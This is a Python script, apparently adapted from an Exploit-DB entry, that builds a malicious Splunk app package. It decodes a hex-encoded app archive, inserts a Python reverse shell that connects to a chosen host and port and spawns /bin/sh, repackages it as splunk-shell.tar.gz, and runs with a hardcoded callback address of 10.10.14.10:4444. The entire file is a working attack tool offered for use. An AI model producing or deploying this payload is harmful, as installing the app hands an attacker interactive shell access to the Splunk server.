# Initial code scavenged from https://www.exploit-db.com/raw/46238

import subprocess
import os

def generatePayload(lhost, lport):
    # Constants
    SPLUNK_APP_DIR = 'splunk-shell'
    SHELL_SCRIPT = 'shell.py'

    print('[*] Creating Splunk App...')
    shell = '1f8b080030e9485c0003ed5b6b6fdb3614cd67fd0a221e9036ab65bd95b87b206b332c5830144bda0e705d8396689b8b446aa214271bf6df7749d9895f8993d451da95e7432c91145f87e7f25e89115952b2b3a6189124696d3d0e2c40e8fbea17b0f8abae6dd7731c3b702c1fd26dc70ead2de43f527fe6508a02e7086de59c17b7955b97ff8542ccf29ff0083fc22a50fc2ff37e0bffaee36bfe6bc10afe7196991167838db521090e6ee11fb85fe0df0bc2700b591bebc12df8caf9ef50061390245d037e0a82be4784e17e4262c3e894b46b50d13ba782420a64d99098e09245239277e13ac3d1191e92ae0109d1596fc0f35e99c5508d50859f7a6c1aeb31a7ff3e658fe103dc63fff71cdf95fb7fe885dafed78139fe535260902fdef022b8bfffe7867affaf07abf98fc900974961ca844f6f4312ec79de8dfcbbaebbc07fe078b6deffeb40a76be0282242eed839c1316aa30eda45dd17689c53f00726b772b3cf79265a82b038c53469750d7291f1bc80e7c4a528486af0312339dc32dee7f1a561341a0df4eee8f0fdc9e9c1e9e1491b9173c220334f71824a417281c48897498cfa04499703151c45d00768558c704e62744ec958b92502dabfbeb963979f7a6abf08acd6bf0a0436a4fef5fe7fe8840bfaf743dbd2faaf031d88f65a931860fadb13bccc23d2535ebd28d3ae710e6aa59c81e042d3315d23e57141531512f89ebfef04e19e65865610ec419c6f8158676b55a2bd531da1e9eebbaee35475dc51e68b66686d3b7bbe6beefb76e8dad77d95a1ceba07617c96e9d976b01f5c3f781d0e4dcd1f8e53caee5a99ebb87bd7954de2a9d6523875e7ce795635aa3bf33fa77fe803d865686ab30ee0fdfd3fcf0eb5ff5f0b6ee05f6a96461b5a06f7e7dff78240f35f076ee71f12121ac125676624c403db58e3ffbb8ee7ccf32fff3a7affaf03ad5df46a84d910bcef11b8e15986123ee408763462222448a1d247840e47456b4ce36284605f4297e021209ac266f5026181c6b07ae4af2c9b612803aebcbc5625d06ecb30a1e66359f13f060254f5b591e766172f914a5275b7d19e05292aa10f9be130e7258bdba8cc9367d33549d3614b9c8173318d525bd51aeec98ef7fa093c66666cf81c428d664e3288279085acaacedea7543aa483a54aff350c98c1d3326708366739e4c9f328e3824add5036447ca0b2b64f549de80d1fc3f4c6db73532d27a96a73923d335daddd5df50ba5d05b16f13425ac2266c093848f651b096544a067630ab3bf1353a80a5fee2019b491bca0443c979c40c03556cfa996659b55f568f2401b3553fe779332595b13e6263aab26ee2a7f92d58708e1eca5ac60a983aadfaa1be391f4d30a72515c65a2262a670720207fccd1ce352fb37d46742057da4e0ca33b83d589e627b01ac5425333839a215b72bdbd96ecacaab7225d552957d2f62ceb22ca61ca25f9a8c831131904aaac585e5d0f6e1056d95d1a8461ca214a2d1e1d063359d1a5cc0218577f56b3a316f53c3b8f4fcec6d8b9d2795dec5cd9804db333b1858e3b357c29ce8794350b9eb5edabc4ca3c06bebcaf8c8e514a7e465448614ff4a9b4cd30c405139323bfe55525956cabb6e40338fe13763e84133a648a6fc5941ca909c41a74b0aa2a048d517665405e4c3788b93eb4617a187909a39bd8fd5f207823f9fb1c2e21401ad913a316f184e7ed46e862df9f98e7993e4ef60618eb53ef90ff6f2c7cff1d8a47f800f480f7fff293b0f6ff6bc032fff2ed2e5c6cb08d75efff2dcb5e8cffbd50bfffab05dabc7eddb851ffa6bdb1361ea0ffc0d1e77f6a81d6ffd78d39fd4fe39f0db7f100ff2fb0b5ff570b56f2af3ef56fee0ce83afb6f078bf6df0f1cfdfeb7163420ec7e37f9b6587d596c74a6673cba46e3e7a3c3e3d707c7470727cd540c698cbe4729fc3d3841ead6681cfe71fafbc1abd3e65f2a6ffa64e7e3876e77f743b7fd417cfbecc7ef20f387cec77677f7795bef379f1756ea7fc327c0a5c66f3bffe1848be7bf7dc70db4feebc0acfe6dd3322da3317d912b5ff8c955408765ae3e01a2014d88612c1f198fa9a8ce8cdf7080048a387b83fd20d8b78965937ee0c5b11b39837e1085180ff62c2f8afca88ffbcefeaa63e7039c086224b84f126963e4526d42e7b429d90056ea9fb2ac2c36e700acddffc3a5f39ff080d67f1d58a5ff57ea10a6409821b512d4770c81d30cd4288f079a205211e5342bdaad96a9fe6b40ad1f33bbec1a535b004ab5c01e14243fc709b22da3b209c565a6245d322ddfcf0137e83f2617646306609dfe9d65fddbdaffaf074bfa37670dc054f56a41ac3003102ba87b8814463c256fe4d10f04f2fee6e4cdf1dbdf7eedbdfea9551568c57da311f124bea588cc96c58a111e93aae0aa625536147ceaa9d3d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0f8ecf11f88a26c5b00500000' 

    # Write payload to file
    with open('splunk-shell.tar.gz', 'wb') as f:
        f.write(bytes.fromhex(shell))

    print('\t==> Adding reverse shell (to {}:{}) to the app...'.format(lhost, lport))
    with open(SHELL_SCRIPT, 'w') as f:
        f.write('import sys,socket,os,pty\n')
        f.write('ip="{}"\n'.format(lhost))
        f.write('port="{}"\n'.format(lport))
        f.write('s=socket.socket()\n')
        f.write('s.connect((ip,int(port)))\n')
        f.write('[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\n')
        f.write('pty.spawn("/bin/sh")\n')

    print('\t==> Verifying shell script creation...')
    if os.path.isfile(SHELL_SCRIPT):
        print('\t==> Shell script created successfully.')
    else:
        print('\t==> ERROR: Shell script creation failed.')

    # Decompress, move, and compress commands
    decompress_cmd = 'tar zxvf splunk-shell.tar.gz &>/dev/null; rm splunk-shell.tar.gz'
    move_cmd = 'mv {} {}/bin/'.format(SHELL_SCRIPT, SPLUNK_APP_DIR)
    compress_cmd = 'tar zcvf splunk-shell.tar.gz {} &>/dev/null; rm -r {}'.format(SPLUNK_APP_DIR, SPLUNK_APP_DIR)

    # Execute commands
    subprocess.run(decompress_cmd, shell=True, executable='/bin/bash')
    subprocess.run(move_cmd, shell=True, executable='/bin/bash')
    subprocess.run(compress_cmd, shell=True, executable='/bin/bash')

    # Cleanup
    if os.path.isfile(SHELL_SCRIPT):
        os.remove(SHELL_SCRIPT)
        print('\t==> Shell script removed.')
    else:
        print('\t==> WARNING: Shell script not found for removal.')

    if os.path.isfile('splunk-shell.tar.gz'):
        print('\t==> Payload Ready! (splunk-shell.tar.gz)')

generatePayload("10.10.14.10", 4444)
